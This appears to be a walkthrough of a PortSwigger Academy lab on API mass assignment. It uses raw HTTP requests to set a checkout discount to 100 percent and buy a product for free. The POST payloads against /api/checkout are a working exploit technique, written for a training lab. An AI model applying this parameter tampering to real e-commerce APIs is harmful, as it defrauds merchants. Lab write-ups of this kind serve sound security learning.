The steps below are meant to solve the following lab:
https://portswigger.net/web-security/learning-paths/api-testing/api-testing-mass-assignment-vulnerabilities/api-testing/lab-exploiting-mass-assignment-vulnerability


API Documentation can be found at https://[LAB_SUB_DOMAIN].web-security-academy.net/api.


Expanding the documentation for the chosen_products key shows the following:
{
  "product_id": String,
  "name": String,        // defaults to: null
  "quantity": Integer,
  "item_price": Integer  // defaults to: 0
}


Making GET request to https://[LAB_SUB_DOMAIN].web-security-academy.net/api/checkout returns the following JSON:

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 57

{"chosen_discount":{"percentage":0},"chosen_products":[]}


Sending a GET request to /api/checkout results in the following response:

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 57

{"chosen_discount":{"percentage":0},"chosen_products":[]}


Switching the method to POST and using the above JSON with the percentage key changed to 100 will result in a response of 201 created. 

POST /api/checkout HTTP/2
Host: [LAB_SUB_DOMAIN].web-security-academy.net
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

{"chosen_discount":{"percentage":100},"chosen_products":[]}


HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Content-Length: 0


Now we manipulate the chosen_products key to contain an object with two keys, product_id and quantity, both set to one  {"product_id": "1",
"quantity":1 }.


The POST request should look something like this:

POST /api/checkout HTTP/2
Host: [LAB_SUB_DOMAIN].web-security-academy.net
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 94

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id": "1",
"quantity":1 }]}


Once the POST request has been sent we should receive a response of 201 created.

HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Content-Length: 0

Looking back on the site we should see that the jacket was successfully purchased and this lab completed.
 
